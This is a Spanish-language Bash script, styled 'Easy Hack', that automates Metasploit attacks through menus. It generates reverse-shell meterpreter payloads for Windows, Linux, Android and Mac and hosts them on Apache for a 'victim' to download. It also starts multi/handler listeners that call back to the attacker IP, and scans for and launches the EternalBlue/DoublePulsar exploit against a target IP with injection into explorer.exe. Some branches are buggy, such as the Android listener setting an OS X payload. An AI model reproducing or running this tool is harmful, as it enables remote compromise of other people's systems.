#!/bin/bash
clear
rm -r Desktop/metasploit.rc
echo "--------------------------DIGITA TU ALIAS----------------------------"
read alias
clear
echo "                                                                         "
echo -e "  \e[1;36m▓█████ ▄▄▄        ██████▓██   ██▓       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀"
echo -e "  \e[1;36m▓█   ▀▒████▄    ▒██    ▒ ▒██  ██▒      ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ "
echo -e "  \e[1;36m▒███  ▒██  ▀█▄  ░ ▓██▄    ▒██ ██░      ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ "
echo -e "  \e[1;36m▒▓█  ▄░██▄▄▄▄██   ▒   ██▒ ░ ▐██▓░      ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ "
echo -e "  \e[1;36m░▒████▒▓█   ▓██▒▒██████▒▒ ░ ██▒▓░      ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄"
echo -e "  \e[1;34m░░ ▒░ ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ██▒▒▒        ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒"
echo -e "  \e[1;34m ░ ░  ░ ▒   ▒▒ ░░ ░▒  ░ ░▓██ ░▒░        ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░"
echo -e "  \e[1;34m   ░    ░   ▒   ░  ░  ░  ▒ ▒ ░░         ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ "
echo -e "  \e[1;34m   ░  ░     ░  ░      ░  ░ ░            ░  ░  ░      ░  ░░ ░      ░  ░   "
echo -e "  \e[1;34m                         ░ ░                             ░               "

echo "***********************************BIENVENIDO $alias************************************"
echo "----------------------------Por favor seleccione una opcion-----------------------------"
echo "****************************************************************************************"
echo -e "\e[1;36m(1) Crear un payload"
echo "  "
echo -e "\e[1;32m(2) Activar modo escucha"
echo "  "
echo -e "\e[1;33m(3) Atacar windows con Ethernatblue"
echo "  "

read -p 'Digite una opcion: ' opciones

case "$opciones" in
 "1" | "1" )
     clear
  echo "**********************Seleccionaste la opcion de crear un PAYLOAD*******************"
  echo "(1) windows"
  echo "(2) Linux"
  echo "(3) Android"
  echo "(4) Mac"
  echo "(5) salir"

read -p 'Digite una opcion: ' opcion
case "$opcion" in


 "1" | "1" )
clear
echo "-------------Crear payload para Windows--------------"
read -p 'Ingrese la ip del ATACANTE: ' ip; read -p 'Ingrese el PUERTO deseado: ' puerto; read -p 'Ingrese el nombre del payload: ' nombre
echo "generando payload, por favor espere..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto -f exe > $nombre.exe
cp $nombre.exe /var/www/html
echo "payload $nombre.exe generado en la ruta /var/www/html/$nombre.exe"
service apache2 start
echo "para que la victima acceda al payload debera ingresar a su navegador y digitar la siguiente direccion ip: $ip"
;;

 "2" | "2" )
clear
echo "---------------Crear payload para Linux----------------"
read -p 'Ingrese la ip del ATACANTE: ' ip; read -p 'Ingrese el puerto deseado: ' puerto; read -p 'Ingrese el nombre del payload: ' nombre
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto -f elf > $nombre.elf
cp $nombre.elf /var/www/html
echo "payload $nombre.exe generado en la ruta /var/www/html/$nombre.elf"
service apache2 start
echo "para que la victima acceda al payload debera ingresar a su navegador y digitar la siguiente direccion ip: $ip"
;;

"3" | "3" )
clear
echo "--------------Crear payload para Android----------------"
read -p 'Ingrese la ip del ATACANTE: ' ip; read -p 'Ingrese el puerto deseado: ' puerto; read -p 'Ingrese el nombre del payload: ' nombre
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > ~/Escritorio/$nombre.apk
cp $nombre.apk /var/www/html
echo "payload $nombre.apk generado en la ruta /var/www/html/$nombre.apk"
service apache2 start
echo "para que la victima acceda al payload debera ingresar a su navegador y digitar la siguiente direccion ip: $ip"
;;

"4" | "4" )
clear
echo "-----------------Crear payload para Mac-----------------"
read -p 'Ingrese la ip del ATACANTE: ' ip; read -p 'Ingrese el puerto deseado: ' puerto; read -p 'Ingrese el nombre del payload: ' nombre
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$puerto -f macho > ~/Escritorio/$nombre.macho
cp $nombre.macho /var/www/html
echo "payload $nombre.macho generado en la ruta /var/www/html/$nombre.macho"
service apache2 start
echo "para que la victima acceda al payload debera ingresar a su navegador y digitar la siguiente direccion ip: $ip"
;;
"5" | "5" )
clear
echo "Hasta pronto"
;;

*)
echo "Opcion invalida"
;;
esac
 
 ;;


"2" | "2" )
clear
  echo "*********************Seleccionaste la opcion de activar escucha*******************"
  echo "(1) windows"
  echo "(2) Linux"
  echo "(3) Android"
  echo "(4) Mac"
  echo "(5) salir"

read -p 'Digite una opcion: ' opcion
case "$opcion" in
"1" | "1" )
clear
echo "-----------------Activar modo escucha Windows------------------"
touch Desktop/metasploit.rc
echo "use exploit/multi/handler" >> Desktop/metasploit.rc
echo "set payload windows/meterpreter/reverse_tcp" >> Desktop/metasploit.rc
read -p 'ingrese la ip del atacante: ' lhost
echo "set lhost $lhost" >> Desktop/metasploit.rc
read -p 'ingrese el puerto de escucha: ' lport
echo "set lport $lport" >> Desktop/metasploit.rc
echo "exploit" >> Desktop/metasploit.rc
clear
echo "INICIANDO ATAQUE..."
msfconsole -r Desktop/metasploit.rc
;;

"2" | "2" )
clear
echo "-----------------Activar modo escucha Linux------------------"
touch Desktop/metasploit.rc
echo "use exploit/multi/handler" >> Desktop/metasploit.rc
echo "set payload linux/x86/meterpreter/reverse_tcp" >> Desktop/metasploit.rc
read -p 'ingrese la ip del atacante: ' lhost
echo "set lhost $lhost" >> Desktop/metasploit.rc
read -p 'ingrese el puerto de escucha: ' lport
echo "set lport $lport" >> Desktop/metasploit.rc
echo "exploit" >> Desktop/metasploit.rc
clear
echo "INICIANDO ATAQUE..."
msfconsole -r Desktop/metasploit.rc
;;

"3" | "3" )
clear
echo "-----------------Activar modo escucha Android------------------"
touch Desktop/metasploit.rc
echo "use exploit/multi/handler" >> Desktop/metasploit.rc
echo "set payload osx/x86/shell_reverse_tcp" >> Desktop/metasploit.rc
read -p 'ingrese la ip del atacante: ' lhost
echo "set lhost $lhost" >> Desktop/metasploit.rc
read -p 'ingrese el puerto de escucha: ' lport
echo "set lport $lport" >> Desktop/metasploit.rc
echo "exploit" >> Desktop/metasploit.rc
clear
echo "INICIANDO ATAQUE..."
msfconsole -r Desktop/metasploit.rc
;;

"4" | "4" )
clear
echo "-----------------Activar modo escucha Mac------------------"
touch Desktop/metasploit.rc
echo "use exploit/multi/handler" >> Desktop/metasploit.rc
echo "set payload osx/x86/shell_reverse_tcp" >> Desktop/metasploit.rc
read -p 'ingrese la ip del atacante: ' lhost
echo "set lhost $lhost" >> Desktop/metasploit.rc
read -p 'ingrese el puerto de escucha: ' lport
echo "set lport $lport" >> Desktop/metasploit.rc
echo "exploit" >> Desktop/metasploit.rc
clear
echo "INICIANDO ATAQUE..."
msfconsole -r Desktop/metasploit.rc
;;

"5" | "5" )
echo "Hasta pronto"
;;

 *)
echo "opcion invalida";
;;


esac
;;

"3" | "3" )
clear
echo -e "\e[1;36m(1) Verificar vunerabilidad"
echo "  "
echo -e "\e[1;36m(2) Windows(x32)"
echo "  "
echo -e "\e[1;32m(3) Windows(x64)"
echo "  "
read -p 'Digite una opcion: ' opcion
case "$opcion" in
"1" | "1" )
clear
echo "--------------Verificar vulnerabilidad---------------"
touch Desktop/metasploit.rc
echo "use auxiliary/scanner/smb/smb_ms17_010" >> Desktop/metasploit.rc
read -p"Digite ip de la victima: " ipv
echo "set RHOSTS $ipv" >> Desktop/metasploit.rc
echo "run" >> Desktop/metasploit.rc
clear
echo "INICIANDO SCANNER..."
msfconsole -r Desktop/metasploit.rc
;;

"2" | "2" )
clear
echo "--------------Ataque a Windows con ethernatblue---------------"
touch Desktop/metasploit.rc
echo "use windows/smb/eternalblue_doublepulsar" >> Desktop/metasploit.rc
read -p"Digite ip de la victima: " ipv
echo "set RHOSTS $ipv" >> Desktop/metasploit.rc
read -p "digite el puerto: " puerto
echo "set RPORT $puerto" >> Desktop/metasploit.rc
echo "set TARGETARCHITECTURE x86" >> Desktop/metasploit.rc
echo "set PROCESSINJECT explorer.exe" >> Desktop/metasploit.rc
echo "set payload windows/meterpreter/reverse_tcp" >> Desktop/metasploit.rc
read -p 'ingrese la ip del atacante: ' lhost
echo "set lhost $lhost" >> Desktop/metasploit.rc
read -p 'ingrese el puerto de escucha: ' lport
echo "set lport $lport" >> Desktop/metasploit.rc
echo "exploit" >> Desktop/metasploit.rc
clear
echo "INICIANDO ATAQUE..."
msfconsole -r Desktop/metasploit.rc
;;
"3" | "3" )
clear
echo "--------------Ataque a Windows con ethernatblue---------------"
touch Desktop/metasploit.rc
echo "use windows/smb/eternalblue_doublepulsar" >> Desktop/metasploit.rc
read -p"Digite ip de la victima: " ipv
echo "set RHOSTS $ipv" >> Desktop/metasploit.rc
read -p "digite el puerto: " puerto
echo "set RPORT $puerto" >> Desktop/metasploit.rc
echo "set TARGETARCHITECTURE x64" >> Desktop/metasploit.rc
echo "set PROCESSINJECT explorer.exe" >> Desktop/metasploit.rc
echo "set payload windows/x64/meterpreter/reverse_tcp" >> Desktop/metasploit.rc
read -p 'ingrese la ip del atacante: ' lhost
echo "set lhost $lhost" >> Desktop/metasploit.rc
read -p 'ingrese el puerto de escucha: ' lport
echo "set lport $lport" >> Desktop/metasploit.rc
echo "exploit" >> Desktop/metasploit.rc
clear
echo "INICIANDO ATAQUE..."
msfconsole -r Desktop/metasploit.rc
;;
esac
;;

esac

